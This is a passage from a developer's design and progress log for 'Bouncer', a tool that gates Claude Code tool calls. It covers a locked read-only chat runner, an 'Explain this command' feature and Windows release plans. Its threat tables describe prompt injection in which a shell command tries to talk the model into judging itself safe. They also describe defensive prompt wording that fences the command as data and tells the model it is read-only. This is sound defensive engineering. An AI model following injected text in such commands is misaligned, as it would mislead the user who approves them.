  Code and shows in the stream as `permission_denied`. No Bouncer cards, so no
  loop or deadlock. (Without `--restricted`, run 1 fired the user's hooks,
  inherited 328 `permissions.allow` rules, loaded the claude.ai connectors
  — Gmail and Slack send among them — and read a file outside its folder.)
- "Default: the user's own Claude Code default" can't hold: `--restricted`
  ignores `settings.json`, and the variables below are removed, so Default is
  Claude Code's built-in default for the plan (`claude-opus-5-5` on Pro today,
  read from the stream's `init.model`). The picker shows that real name.
- `--bare` can't be used: it never reads the subscription login.
- Cancel is a kill, not SIGINT (Windows has none for a hidden child). With no
  session saved, a cancelled chat's context is gone: the panel says "New chat".

**The locked command line** (a constant; never built from input, never
weakened):

```
claude.exe -p --input-format stream-json --output-format stream-json --verbose
  --include-partial-messages --restricted --tools Read,Grep,Glob
  --disallowedTools mcp__* --strict-mcp-config --permission-mode dontAsk
  --permission-prompts none --max-turns 8 --no-session-persistence
  --append-system-prompt <the fixed read-only line, SYSTEM_LINE>
  [--model haiku|sonnet|opus|fable]
```

- `--restricted`: no user / project / local settings (hooks, allow rules,
  `apiKeyHelper`), file tools confined to the working folder (an outside read
  is refused: "path outside the working directory"), no `bypassPermissions`.
- `--tools Read,Grep,Glob`: no Bash, Edit, Write, Web, Agent. `--tools` doesn't
  cover MCP, hence `--disallowedTools mcp__*` and `--strict-mcp-config` (the
  init event then lists no MCP servers).
- `dontAsk` + `--permission-prompts none`: anything that would prompt is
  denied, Claude is told not to retry, `AskUserQuestion` is removed.
- `--max-turns 8` is real (`-p` only) though `--help` doesn't list it.
- One live process per chat: each message is one stream-json line on stdin,
  one `result` per turn; context carries across turns (checked with two turns)
  and `--no-session-persistence` leaves no transcript (checked).
- If the installed `claude` rejects any flag (stderr `error: unknown option …`,
  exit 1, before any stream event), the panel says "This Claude Code version
  isn't supported for chat (2.1.x)" and never retries without it.

**Auth, keys and the environment.** Every run reported `apiKeySource: none`
(the claude.ai login, `auth status`: `claude.ai`, `pro`). Bouncer never reads,
stores or passes a key or token. The child's environment drops, by name only
(values never looked at, stored or logged), every variable that can change
auth, endpoint, provider, billing or which login is used: all `ANTHROPIC_*`
(API key, auth token, base URLs, custom headers, model pins, Foundry / AWS
keys), all `CLAUDE_CODE_*` (`USE_BEDROCK`, `USE_VERTEX`, `USE_FOUNDRY`,
`USE_ANTHROPIC_AWS`, `USE_MANTLE`, `SKIP_*_AUTH`, `OAUTH_TOKEN`,
`OAUTH_REFRESH_TOKEN`, `CLIENT_CERT` / `KEY`, `PROVIDER_MANAGED_BY_HOST`,
`SIMPLE`, `ENTRYPOINT` …), `CLAUDECODE`, `CLAUDE_CONFIG_DIR`, all `AWS_*`
(`AWS_BEARER_TOKEN_BEDROCK`, `AWS_SECRET_ACCESS_KEY`, `AWS_PROFILE` …), all
`GOOGLE_*`, `CLOUD_ML_REGION`, `VERTEX_REGION_*`. Prefixes, so new variables
are covered too. Kept: `HTTP(S)_PROXY` / `NO_PROXY` (they route, they don't
authenticate or bill). A run whose `init` reports any `apiKeySource` other
than `none` is stopped at once.

**The binary.** On Windows `claude` on PATH is npm's `claude.cmd` / `.ps1`
shim; spawning a `.cmd` runs cmd.exe, a shell. Only a native executable is
accepted (npm's `node_modules/@anthropic-ai/claude-code/bin/claude.exe`, or the
native installer's `~/.local/bin/claude.exe`; `claude` on macOS);
`.cmd`/`.ps1`/`.bat` and anything else are refused. The full path is shown and
must be confirmed; a changed path (or file) asks again.

**Spawning.** `Command::new(exe)` with the constant argv, the working folder
and the scrubbed environment, no window on Windows, stdin/stdout/stderr piped.
The prompt goes only on stdin, as one line built with `serde_json` (never
string formatting). Model only from the fixed list; an unknown name is refused
before spawning. If the plan can't use a model, Claude Code's error text is
shown.

**Killing the tree.** Windows: the child goes into a Job Object with
`KILL_ON_JOB_CLOSE`; cancel, timeout and quit close it, and so does a Bouncer
crash (the kernel closes the handle). The short gap between spawn and
assignment is harmless: the child starts nothing before a model round trip.
macOS: `process_group(0)` (std), then `kill(-pgid, SIGTERM)` and SIGKILL after
2 s (`kill` declared like `getpeereid` in `relay/unix.rs`); a crash closes
stdin and `claude -p` exits on EOF.

**Limits.** `--max-turns 8`; 5 minutes per message; stopped after 60 s with no
stream event of any kind (thinking, partial and status events count).

**Working folder.** `Bouncer/chat` next to the rules file: created owner-only,
checked like the rules folder (no link, nobody else can write), and refused
unless empty. Picking a project comes in Phase 7.

**Output.** Rust reads the line-delimited JSON (1 MB per line cap; garbage and
unknown types skipped) and sends the page only typed events: text deltas,
tool use as a chip (tool name and target, hidden characters made visible),
denials, turn end with its error kind, the model name, and plan usage.
Thinking, tool results (file contents) and raw stderr never reach the page;
a failure shows its exit code or Claude Code's error line. The page renders
with `textContent` (`pre-wrap`), never HTML.

**History.** None in Phase 6: chats live in memory only, nothing on disk.

**Cost.** Chat counts against the Claude plan. The stream's `rate_limit_event`
carries the plan's 5-hour and 7-day usage; the
panel shows "Runs your Claude Code · counts against your plan" with those two
numbers. `total_cost_usd` is an API-price estimate, misleading on a plan: not
shown.

**Starting from an existing session (6d, checked, not built).** `-p --resume
<session-id> --fork-session` with the locked flags, from the empty chat folder:
the copy got a new session ID and knew the original's context; the original
transcript was byte-identical (same SHA-256 and mtime) and no new transcript
appeared (`--no-session-persistence`); tools stayed Read / Grep / Glob in the
empty folder. Bouncer never reads the transcript: Claude Code loads it by ID
(any project on the machine). Docs: forking a session still running in the
background resumes a copy with these flags; an interactive one is only read.
The ID comes from the session list (hook events), must be a UUID (checked
before spawning), and is the only variable argv. The copy re-sends that
session's whole history, so a big session costs more usage: the panel says so.

| Threat | Fix |
| --- | --- |
| Command / argument injection through the prompt | Constant argv; prompt only on stdin as a `serde_json` line; model from a fixed list; session ID must be a UUID |
| Chat run takes actions on the machine | `--restricted`, `--tools Read,Grep,Glob`, `dontAsk`, `--permission-prompts none`: nothing prompts, the rest is denied |
| Connectors / MCP act for the chat (Gmail, Slack send) | `--strict-mcp-config`, `--disallowedTools mcp__*` |
| The user's allow rules or hooks apply to chat | `--restricted` ignores the settings files |
| Chat reads outside its folder | `--restricted`; an empty owner-only folder |
| Billed through an API key or another provider | Auth / endpoint / billing variables removed; any `apiKeySource` but `none` stops the run |
| A flag silently dropped by an older `claude` | Unknown option → "isn't supported for chat", never a retry without it |
| A shell runs (`.cmd` shim) | Native executable only; full path shown and confirmed |
| Model output injects markup | `textContent` only, same as agent text |
| Hung or runaway child, left-over children | 5 min / 60 s silent deadlines, cancel, quit: the whole tree is killed (Job Object / process group) |
| Output flood | 1 MB per line, garbage skipped |
| Secrets in chat history | No history in Phase 6; tool results never kept |
| Transcripts written | `--no-session-persistence`; a fork leaves the original untouched |

PRs:

- **6a — chat runner (core).** Binary check, locked argv, environment
  scrubbing, spawn, prompt line, stream parser, deadlines, tree kill. Tests
  against a fake `claude` (an example binary that records argv, stdin and
  environment names, replays fixtures, hangs, floods, or starts a grandchild)
  and the parser against the recorded audit runs. TESTS.md C1–C16.
- **6b — chat panel.** Panel, cancel, "New chat", model picker with the real
  Default name, usage line, the note, `claude` missing / unsupported / path
  confirm in Settings, new commands in the allow-list. C17 on.
- **6c — checks.** Real clicks on the test instance, hand check (a real chat),
  docs.
- **6d — start from a session.** Fork a session from the list, read-only as
  above. Its own rows.

**6b plan (2026-10-09, after #21 / v0.6.0).** Prototype v0.21 has the
panel's states (first run, empty, answering, tool and denial, errors,
cancelled, Settings' claude path). Decisions inside Charan's brief:

- The panel has a fixed height (400 × 460, under the open max height): a
  streaming answer never resizes the window, and only the log scrolls. Text
  deltas are appended in place; the island isn't rebuilt per delta.
- The confirmed path lives in `Bouncer/claude-path.txt` (owner-only, checked
  like the rules file, written atomically). A send re-finds `claude` and
  runs only if it's the confirmed file; otherwise the panel asks again.
- One chat at a time, one worker thread owning it; the page holds the
  transcript (memory only). Switching model ends the chat (a "New chat · Sonnet"
  line); the head's "New chat" clears it. Quitting kills the chat's tree.
- Default's real name shows after its first reply (the stream's `init`): a
  probe would cost a run.
- A card arriving while you type in the chat: the keyboard goes nowhere
  (not to Deny), so a space or Enter in mid-sentence can't answer the card.
- Entry: a chat button next to the gear in the session list; opened on
  purpose, it takes the keyboard. Esc closes it; the chat keeps running.

**6b checks (2026-10-09).** Test instance A (scratch rules, its own pipe,
WebView2 folder and debug port, the fake `claude` first on PATH) and B
(playground rules, the real `claude`), real clicks and keys behind the guard
on a black backdrop. Screenshots: `design/screenshots/chat/`.

CPU, % of one core, app + WebView2 (the `claude` child left out), 60 s:

| Case | Result |
| --- | --- |
| Session list open, idle (baseline) | 1.7% |
| Chat panel open, idle, keyboard in the message box | 2.6% with a blinking caret → **1.1%** (`caret-animation: manual`) |
| Streaming (fake, 20 deltas/s, 75 s answer) | 81.2% one update per word → 30.5% page batching 4/s → **15.0%** worker batches 2/s + the log scrolls on its own layer |
| Streaming, by process (20 s) | app 1.4, WebView2 browser 0.3, GPU 4.8, renderer 5.9 |

Every update is a frame of the whole transparent window (the cost the motion
budget found); streaming lasts only as long as an answer.

Real-click results: open via the chat button (keyboard in the message box);
first run shows the full path, Send disabled; Settings' Confirm writes the
canonical path, × goes back to the chat; Shift+Enter a new line, Enter sends;
tool chip, denial, answer, plan use and Default's name (the fake's); Cancel:
"Cancelled.", "New chat", no `claude` left; Fable / plan error, unsupported,
crash; Tab order and Esc; a card mid-stream (below); the app force-stopped
with a chat open: no `claude` left (twice). Real chat (B, Haiku): tool chip,
denial, answer, plan use; the playground's `chat` folder still
empty, no transcript, no history written; the `claude-path.txt` the test
confirmed in the playground was deleted afterwards.

Found by these checks and fixed:

- A card arriving while typing: the card's arm re-render put the keyboard on
  Deny and the typed space denied it. Now it stays nowhere for that card
  (`heldCard`, tested); Tab still reaches Deny.
- One update per streamed word cost 60–80% of a core (above).
- A blinking caret repaints for as long as the box has focus (above).
- A real run's long path widened the log: answers stopped wrapping. The log's
  column is capped (`minmax(0, 1fr)`, tested); a cut chip shows all on hover.
- The message box was skipped by focus restore and Tab (`textarea` missing
  from the lists); a disabled control could take the restore and strand the
  keyboard.

Review of #22 (Charan), fixed:

- Haiku described itself as able to edit and run commands. Every run now
  gets one fixed line (`--append-system-prompt`, a constant in the locked
  command line, C10): a read-only chat inside Bouncer, Read / Grep / Glob in
  an empty folder, no edits, commands or web. Real Haiku, asked: "I can't
  edit or write files, run commands, or use the web."
- Esc in Settings opened from the chat closed both; now it closes Settings
  and returns to the chat with the keyboard in the message box (C31).
- Privacy: the screenshots that showed a real path or plan use were retaken
  with the path and plan use covered and labelled; the prototype's sample
  paths and the chat fixtures' plan use are neutral now; the PR branch was
  rewritten so no commit holds the old images.

Phase 6 is done when:

- [x] Chat round-trip through `claude -p` with no API key (`apiKeySource: none`; C16, C30)
- [x] Injection, hostile-output, cancel, timeout and quit tests pass on Windows and macOS (CI, #21 and #22)
- [x] Chat runs can't act: no tool but Read / Grep / Glob in an empty folder, nothing prompts
- [x] No auth / endpoint / billing variable reaches the child; a key source stops the run
- [x] A rejected flag shows "isn't supported for chat" and never retries without it
- [x] Nothing about a chat is written to disk
- [x] fmt, clippy, tests and `check-tests` green locally and in CI
- [x] Hand check 3 (Charan): one real chat on the dev app (`docs/TESTS.md`), 2026-10-12
- [ ] 6d: start a chat from a copy of a session

**6c (2026-10-12).** No Windows user name left in the tree: the sample
paths in four Rust tests now use `dev`, and the island's Phase 2 approval
screenshot has its path covered and labelled (the chat fixtures' plan use
was made neutral in #22). README: a Chat section. Hand check 3 written for
Charan.

Manual checks:

- 2026-10-12, hand check 3 (Charan, dev app, playground rules, Claude Code
  2.1.295, Haiku): passed. Path confirmed in Settings, Esc back to the chat;
  asked what it can do, it said read-only (Read, Glob, Grep; no edits,
  commands or web); `claude.exe` went from 13 to 14 with the chat open and
  back to 13 after Quit; Cancel showed "Cancelled." and "New chat"; + cleared
  the panel; the chat folder stayed empty. Step 4: Haiku didn't try the read
  at all (it said `../rules.toml` is outside its folder), so no "Read" chip
  or denial showed: the fixed read-only line makes it decline first. The
  lock itself (a read attempt denied) is covered by C16 / C30. Seen: answers
  show Markdown as raw text (`**bold**`, `- ` lists, backticks).

## Roadmap after Phase 6c (Charan, 2026-10-12)

The order from here. Each item is its own PR (one agent per PR in h), and each
runs the four stages (Audit → Implement → Test → Verify) with its tests,
`docs/TESTS.md` rows and green CI; nothing merges without Charan's OK.

| # | What | Notes |
| --- | --- | --- |
| a | Markdown in chat answers | Headings, paragraphs, lists, bold / italic, inline code, code blocks (the diff pane's tokenizer): elements we build, filled with `textContent` only. Links show as text and are never clickable. No new dependency. |
| b | 6e "Explain this request" | A button on a permission card asks the read-only chat what the command does and what could go wrong. The command goes in as text (the prompt on stdin, never argv). Allow / Deny keep working (arm delay, focus rules) while it answers; it never decides anything. A card still comes first. |
| c | Windows release | Phase 9's Windows part, pulled forward: installer, GitHub release on tags (checksums, attestations), README with a demo GIF and install / uninstall steps. Audit first: the signing options and their cost ($0 if possible). Includes the pre-release fixes from `docs/COMPARE.md`: measure memory use (app + WebView2, idle and with a card) next to the CPU numbers; a per-user installer (no admin) with a clean uninstall (our hook entries removed only with the diff and a yes); autostart, off by default; SmartScreen and Defender notes with checksums; Settings warns when installed hooks are missing events, one click re-installs (pulled forward from Phase 9); one shortcut that jumps to the waiting card and never approves. |
| c2 | Questions in the island | Answer Claude Code's questions (AskUserQuestion) in the island, with Allow's 600 ms arm delay (backend and page) and its keyboard rules (focus never on an answer that acts, Enter never answers, a question arriving while typing takes no keys). Today they go to the terminal (A10). |
| d | File drop (Phase 7) | Drop a file, then choose "Is this safe to run?" or "Ask about it". Read-only; nothing is sent before Charan confirms. |
| e | Music (Phase 8) | Within the motion and CPU budget. |
| f | 6d "Ask about this session" | Fork a session read-only (Phase 6 audit, "Starting from an existing session"). |
| g | Mac release | Phase 9's Mac part, tested on a real Mac (the checklist under Phase 9). |
| h | Other agents | For each (Codex, Cursor, Gemini CLI, Copilot CLI, others): audit first whether its hooks can block a tool call. Yes: full approvals. No: watch-and-flag only, clearly labelled as such. One agent per PR. |
| i | Linux build | Optional. |

**Goal (Charan):** on Windows, Bouncer must be clearly better than Coucou
where it matters: safety, CPU and memory, reliability. Before the release PR
(c), `docs/COMPARE.md` sets out, from Coucou's public source (read, never
installed or run): what they have, what we have, where we're better, where
we're behind, and what to fix before release.

**Roadmap a: Markdown in chat answers (2026-10-12).** `src/markdown.ts`
reads an answer into blocks (paragraphs, headings, lists, quotes, rules,
fenced code) and pieces (bold, italic, inline code); `main.ts` builds the
elements and fills every piece through `agentText` (`textContent`, hidden
characters as tags). Links come out as their words and address in plain
text: no `<a>` anywhere. The answer so far is read again on each streamed
batch (twice a second at most), so lists and code blocks form as it streams.
No new dependency. Checked on the test instance (real clicks, the fake's
`md` answer): blocks as expected, no links, the tag shown as text; 6.5% of a
core while streaming (30 s), no worse than before. C32–C33.

**Roadmap b: 6e "Explain this request" (2026-10-12).**

Audit. The card already has everything needed: the desk's view holds each
waiting request's tool and whole command (hidden characters as `\u{…}`), and
the Phase 6 runner gives a locked chat. Decisions inside Charan's brief:

- The page sends only the card's request ID (`explain`); the backend takes
  the command from the waiting request itself, never text from the page.
- Shell commands only (Bash, PowerShell): "what the command does". Write and
  Edit already show their whole content and diff on the card.
- Its own run of the locked chat (the same constant command line, confirmed
  `claude`, empty folder, limits, environment), one message, one at a time.
  Not the chat panel's conversation: a card can come while a chat streams.
  The model is the panel's choice (Default unless changed).
- The prompt (core, `explain_prompt`) is fixed wording: what it does, then
  what could go wrong, never whether to allow; the command is data, fenced by
  more `~` than any run in it, so it can't close the fence and pose as the
  instructions. It goes on stdin as one `serde_json` line like every prompt.
- It ends when answered, on Stop (`explain_stop`), at quit, when another one
  starts, and whenever a view comes without its card (`show`, which every
  queue change goes through: answered, timed out, gone). Each run has a
  number, so an old run finishing never clears a newer one on the same card.
- The page: a dashed "Explain this command" under Deny / Allow. The box goes
  below them at a fixed height (132 px of text, then it scrolls): the
  buttons never move and the window doesn't resize while it streams. Its
  text is filled in place (twice a second at most, as chat), so the card
  isn't rebuilt under the mouse and a click on Deny is never lost. Allow
  re-arms (600 ms) whenever the box opens or closes, in case the island sits
  at the screen's bottom and the window had to move. Explain, Stop and Hide
  are one control (one key), so the keyboard stays on it, never Allow.
- "A card still comes first" holds: the box lives inside the card, below
  its buttons, and nothing else about the card changes.

| Threat | Fix |
| --- | --- |
| The page (or anything in it) gets other text explained or sent | Only an ID goes up; the text comes from the waiting request; a card not waiting → `gone` |
| The command talks the model into "it's safe, allow it" | Fixed wording asks for no verdict and calls the command data; the fence can't be closed early; the box says "Can be wrong · you decide"; nothing it says changes the card, the rules or the risk |
| The explanation answers the card | No answer path in it (tested by reading the source); Deny / Allow unchanged |
| Buttons move under the mouse, or a click is lost to a rebuild | Box below the buttons, fixed height, filled in place; Allow re-arms on open / close |
| Keyboard lands on Allow | One key for Explain / Stop / Hide; the keyboard-arrival rule still goes to Deny |
| A run outlives its card | Stopped with every view that lacks the card, on Stop, at quit, by the chat limits |
| Argv or lock weakened | The same constant command line (C10); the prompt only on stdin (E2) |
| Model text injects markup | Text nodes only (Markdown as roadmap a); UI11 |

Done when:

- [x] Explain on a shell card streams an answer from the locked chat; other tools have no button
- [x] Only the request ID goes up; hostile commands stay data on stdin; argv locked (E1, E2)
- [x] Deny / Allow work while it answers; buttons never move; Allow re-arms; focus never on Allow (E4–E6)
- [x] It stops with Stop, the card leaving and quit; its `claude` is gone (E7)
- [x] Prototype v0.23 has the state and a build-spec rule; `docs/TESTS.md` E1–E8
- [x] fmt, clippy, tests and `check-tests` green locally; CI on the PR

Checks (2026-10-12), test instance (scratch rules, its own pipe, WebView2
folder and debug port, the fake `claude` first on PATH; a black backdrop;
real clicks and keys behind the guard; requests sent through the scratch
relay). Screenshots: `design/screenshots/explain/`.

- Not confirmed yet: "Confirm the claude path in Settings first.", buttons
  unmoved. After confirming in Settings: the answer streams in, the island's
  height stays the same (570.95 px in both samples) and Deny / Allow stay put.
- Deny mid-stream on a risky card: Claude Code got the deny; the
  explanation's `claude` was gone within 1.5 s.
- Allow re-armed: disabled at the Explain click, armed 600 ms later.
- Keyboard: focus on Stop; Space → "Stopped." and Hide; Enter on Hide → the
  button back, focus on it; Enter on it → explaining again.
- Review of #28 (Charan): a click on Explain that also gave the island the
  keyboard put focus on Deny (A2), so a Space then denied. Fixed: a press on
  Explain or its box that takes the keyboard keeps it there
  (`arrivalFocus`); any other arrival (the tray, the gear, a click elsewhere
  on the card) still goes to Deny, never Allow. Rechecked with real clicks:
  Explain without the keyboard → focus on Stop, Space stopped it (no
  answer); a click on the card's title → Deny; a click in the box → its
  button.
- "Always allow…" and Explain together (Charan asked where Always allow
  went): it shows only when the backend offers a rule, unchanged by this
  PR. The check's cards had none: `ls`, `cargo build` and `pwd` are allowed
  by the default rules ("Would auto-allow"), the risky one never gets one,
  a pipe or a `#` comment isn't offered, and the instance's session came from
  a fixture whose project folder doesn't exist here. A card from a real
  project (`terraform plan`): Deny, Allow once, Always allow… and Explain;
  with the explanation open, Always allow… previews the exact rule and
  Cancel brings the buttons back.
- The app stopped with a card and an explanation up: the relay printed
  nothing (fail safe); a card left 100 s timed out as usual.
- Once, early on, a Space on Stop closed the whole box instead of showing
  "Stopped."; not reproduced in three tries since (recorded with key and
  click events). Watch for it.
- CPU, % of one core, app + WebView2 (the `claude` child left out): a card
  with the cursor on it 4.8%; while an explanation streams (8 s, the fake
  sends a piece every 200 ms) 20.7%; answered and still up 5.7–7.1%; box
  closed 6.3%. Streaming lasts only as long as the answer.

**Roadmap c: Windows release (audit 2026-10-12, decisions Charan 2026-10-12).**

Audit. Read: `docs/COMPARE.md`, Phase 9, `tauri.conf.json`, `bin/bouncer.rs`,
`hooks.rs`, `main.rs` (tray, `about`, `hook_status`), the Settings screen,
the CI workflows; Tauri's Windows installer guide; the signing options.

What the plan had wrong or missing:

- **No MSI.** Tauri's MSI installs per machine (admin). NSIS installs per
  user under `%LOCALAPPDATA%`, no admin (Tauri's default `currentUser`).
  `bundle.targets` was `"all"` (both): NSIS only.
- **Installed users had no way to add the hooks.** Only `bouncer
  install-hooks` in a terminal could; Settings showed the command as text.
  The installer ships `bouncer-hook.exe` and `bouncer.exe` beside the app,
  and Settings does install / re-install / remove itself (diff, confirm,
  dated backup, atomic write: rule 6, the same code as the CLI).
- **The version was `0.0.0`** everywhere; installer upgrades need a real
  one. It now comes from the release tag (Cargo, `tauri.conf.json`, the
  installer).
- **A tag on every merge** would publish a release per merge. From now on a
  tag means a release (`v*.*.*`, first `v0.7.0`); the old `v0.5.x` /
  `v0.6.x` tags never trigger it.
- **User data isn't in the app ID's folders.** Rules, preferences, history
  and the chat folder are in `%APPDATA%\Bouncer`; WebView2's data is under
  `%LOCALAPPDATA%\io.github.charanp11.bouncer`. The uninstaller's data
  option removes exactly those two, only when ticked.

Signing (cost, what users see):

| Option | Cost | Result |
| --- | --- | --- |
| Unsigned | $0 | SmartScreen "Windows protected your PC", Unknown publisher → More info → Run anyway; Edge may say "not commonly downloaded". Smart App Control (when on) blocks it with no override. |
| SignPath Foundation | $0 | Publisher "SignPath Foundation"; OSI license, CI-built releases, MFA, a manual approval per release, an existing release with some reputation (their call). SmartScreen warnings fade with downloads. |
| Azure Artifact Signing | ~$9.99 / month | Own name; individuals in the US / Canada only, ID check; reputation still builds over time. |
| Certum open-source certificate | ~€49 | Removes "Unknown publisher"; SmartScreen effect disputed; certificates now at most 459 days. |
| OV certificate (other CAs) | ~$150–300 / year | As Certum. |

Decisions (Charan, 2026-10-12):

1. v0.7.0 ships unsigned with the SmartScreen walkthrough, SHA-256
   checksums and attestations; apply to SignPath once it's out. The release
   workflow keeps a slot for a signing step.
2. Shortcut: `tauri-plugin-global-shortcut` (approved new dependency,
   pinned; deny and npm-audit stay green). Default Ctrl+Alt+B, can be
   turned off in Settings; it opens the island and focuses Deny, never
   approves.
3. Tags: a tag means a release; the workflow runs only on `v*.*.*` tags
   created from now on and makes a **draft** (Charan presses Publish).
4. Uninstall's "Also delete my Bouncer data" box: the one documented
   exception to "one wipe path". Unticked by default, uninstall only,
   removes only `%APPDATA%\Bouncer` and the WebView2 folder.
5. First release: v0.7.0.
6. Before the release: check where Bouncer works (Claude Code in a
   terminal, the VS Code extension, the Claude desktop app's Code tab),
   playground hooks only: do our hooks fire, PermissionRequest included,
   and does Allow / Deny from the island reach it. Results in the README's
   "What it can't do", with Claude Code on the web (cloud), which can't be
   seen.
7. After the release, the roadmap order becomes: v0.8 questions (c2), v0.9
   file drop (d), other agents one per release (h), Ask about this session
   (f), Mac (g), music (e), Linux (i, optional). One feature per release.

PRs, in order (each its own four stages, `docs/TESTS.md` rows, green CI,
Charan's OK before merging):

| # | PR | Done when |
| --- | --- | --- |
| c-1 | Audit and memory (docs) | This section; memory measured next to the CPU numbers; `COMPARE.md` updated |
| c-2 | Hooks in the app | Settings shows installed / incomplete / moved / missing; install, re-install and remove from Settings with the diff, Confirm, dated backup and atomic write; the CLI unchanged in behaviour, sharing the code |
| c-3 | Autostart | Settings switch, off by default; per-user `Run` key only; off removes only our value |
| c-4 | Shortcut | Ctrl+Alt+B opens the island with the keyboard on Deny (or the list with no card); never approves; Settings turns it off; registration failure is harmless |
| c-5 | Installer | NSIS only, per user, no admin; relay and CLI beside the app; version from the tag; uninstall offers hook removal (diff, y/N, backup) except during upgrades and silent runs; data box unticked by default; install → use → uninstall on the test instance gives back the scratch `settings.json` byte for byte |
| c-6 | Release workflow | On `v*.*.*` tags only: checks, build, `SHA256SUMS.txt`, build attestation, draft release with notes; write permissions only in that job; a signing slot |
| c-7 | README and demo GIF | What Bouncer is, demo GIF (no real paths or plan use), install / verify / uninstall, SmartScreen and Defender notes, what it can't do (with the surfaces check, decision 6); then the roadmap order (decision 7) |

Memory (c-1, 2026-10-12). Release build (`--release`, custom protocol)
from a scratch target, its `%APPDATA%` and `%LOCALAPPDATA%` pointed at a
scratch folder (so rules, history and WebView2 data stayed there), on the
real pipe while no other Bouncer ran. Sampled once a second for 60 s over
the app and every process under it (8: the app and WebView2's). "Private"
is the private working set, Task Manager's "Memory" column; average / peak.

| Case (60 s) | Private, all (MB) | App alone (MB) | Working set incl. shared (MB) | Private bytes (MB) |
| --- | --- | --- | --- | --- |
| Idle, no session | 93.1 / 95.0 | 5.1 | 397.7 / 401.8 | 143.4 / 145.6 |
| A card up (Bash request) | 103.2 / 115.6 | 5.1 | 410.5 / 419.6 | 156.8 / 167.7 |
| After the card timed out (session listed) | 102.7 / 109.5 | 5.1 | 410.5 / 416.9 | 155.9 / 162.8 |

WebView2 is ~95% of it; our Rust process is 5 MB. A card adds ~10 MB and
it stays about level after (no climb across the 60 s). Coucou not measured:
that means installing it, which belongs on a separate test machine, not
this PC. The chat runs Claude Code, whose memory is its own and not counted.

| Threat | Fix |
| --- | --- |
| Installer needs admin, or writes outside the user's folders | NSIS `currentUser`; no MSI |
| Uninstall leaves hooks that point at a deleted relay | Uninstall offers removal with the diff; a "no" says what Claude Code will show and how to remove them later |
| Upgrade removes the hooks | The hook step is skipped in update mode and silent runs; the install folder (and so the hook path) stays the same |
| Uninstall deletes data by surprise | The data box is unticked; it removes only the two named folders; documented as the one exception to "one wipe path" |
| Settings writes `settings.json` silently | The same rule-6 path as the CLI: diff shown, Confirm, dated backup, atomic write, refused if the file changed meanwhile; shared code, shared tests |
| A shortcut approves | It only opens the island and focuses Deny (arrival rule); tested by reading its handler; Allow keeps its arm delay |
| A shortcut taken by another app | Registration failure is ignored (the island works without it); Settings can turn it off |
| Autostart behind your back | Off by default; only our value in the per-user `Run` key, removed when turned off |
| Tampered download | Built only by CI from a tag; `SHA256SUMS.txt`; GitHub build attestation; draft until Charan publishes |
| Release job abused | Only it gets `contents: write`, `id-token: write`, `attestations: write`; Actions pinned by SHA; no secrets until signing |
| WebView2 missing on install | The installer's bootstrapper fetches it (the installer's only network use; the app still makes none); documented |
| Unsigned binary flagged | README walkthrough, checksums, attestation; Defender false-positive report link; SignPath after v0.7.0 |

**c-2: hooks in the app (2026-10-12).** The CLI's file code (dated backup,
atomic write, changed-meanwhile refusal) moved into `core::hooks` as
`plan` → `Change::diff` → `Change::write`; the CLI and Settings both use
it, and the CLI's output is unchanged. `hooks::status` checks every event
for our hook running the relay beside the app, with its timeout:
installed, incomplete, another copy (moved) or not installed. Settings
offers Install… / Re-install… / Remove…: `hooks_preview` returns the file,
the diff (redacted: its context lines can hold a token from `env`) and a
single-use id; an armed "Write changes" sends only the id (`hooks_write`).
Prototype v0.24 ("Settings · hooks"). TESTS I8, I9.

- [x] Status in Settings: installed / incomplete / another copy / not installed (I8)
- [x] Install, re-install, remove from Settings with diff, armed confirm, single-use id, backup, atomic write (I9)
- [x] The CLI behaves as before (I1–I7 unchanged, its tests pass)
- [x] Test instance (scratch `CLAUDE_CONFIG_DIR`, page-level clicks over CDP): a Write before the arm did nothing; the token in the context showed as `[redacted]`; install then remove gave back the exact bytes, a backup each time; one event removed by hand → Incomplete, Re-install → Installed; Cancel and a file changed under the open diff wrote nothing ("changed meanwhile; try again")

**c-3: Start with Windows (2026-10-13).** `core::autostart`: one value,
`Bouncer` (the quoted app path), in `HKCU\…\CurrentVersion\Run`; no
admin. The value is the setting (nothing in `preferences.json`), so the
switch always shows what Windows will do. Off deletes only a value whose
program has this app's file name; someone else's `Bouncer` value stays.
Debug builds can use another key (`BOUNCER_AUTOSTART_KEY`, ignored in
release: R13, checked by CI in a release build), so tests and the test
instance never touch the real `Run` key. Not offered off Windows yet (the
row is hidden; roadmap g). Prototype v0.25. TESTS W2.

- [x] Off by default; on / off from Settings; only our value (W2)
- [x] Test instance (page-level clicks, a test key): Off → On wrote the quoted path; On → Off removed it; the real `Run` key was the same before and after

**c-4: Shortcut (2026-10-13).** `tauri-plugin-global-shortcut` pinned at
`=2.4.0` (2.4.1 was three days old), used from Rust only: no plugin
permission is granted to the page. Ctrl+Alt+B runs `open_island`, the tray's
"Open Bouncer": the island opens with the keyboard, and the page's arrival
rule puts it on Deny when a card is up. `preferences.json` gains `shortcut`
(on by default); Settings' switch saves it and registers or drops the keys.
A failed registration only sets "taken" (the hint says so). Registered after
the second-launch check. Prototype v0.26. TESTS W3.

- [x] Ctrl+Alt+B opens the island, Deny focused with a card up, nothing answered (W3)
- [x] Settings turns it off and on; taken by another app is harmless and shown
- [x] Test instance: while it ran, a second registration of Ctrl+Alt+B from PowerShell failed (it held the keys), so the key press reached only Bouncer; with a Bash card up, Ctrl+Alt+B moved focus from the page body to that card's Deny, Allow untouched, the relay still waiting (it printed nothing when the app was stopped); off → keys free and `"shortcut": false` saved; held by PowerShell → on reports taken; released → on holds them again; app stopped → keys free

**c-5: Installer (2026-10-13).** NSIS only (`bundle.targets`: nsis, app,
dmg; no MSI), `installMode: currentUser` → `%LOCALAPPDATA%\Bouncer`, no
admin. `scripts/bundle.mjs` builds the relay and the CLI in release, copies
them to `crates/app/binaries/<name>-<triple>` and runs `tauri build` with
`tauri.release.json` (just `externalBin`; kept out of `tauri.conf.json`
because every plain cargo build would then need them). Installed beside
the app: `bouncer-app.exe`, `bouncer-hook.exe`, `bouncer.exe`,
`uninstall.exe`. Installer: **2.24 MiB** (2,353,157 bytes), version still
0.0.0 until the release workflow (c-6) sets it from the tag.

Uninstall (`installer-hooks.nsh`, on Tauri 2.12.1's template):
- Before the files go: `bouncer.exe uninstall-hooks --uninstalling` in its
  own console (the CLI: diff, y / N, dated backup, atomic write). The flag
  puts why it asks ("Bouncer is being uninstalled… Installing Bouncer
  again next? Answer N")
  right above the question, says what a "no" means, and waits for Enter.
  Skipped in update mode, silent / passive runs, and whenever an installer
  runs the uninstaller (below).
- After: Tauri's "Delete the application data" box (unticked) removes the
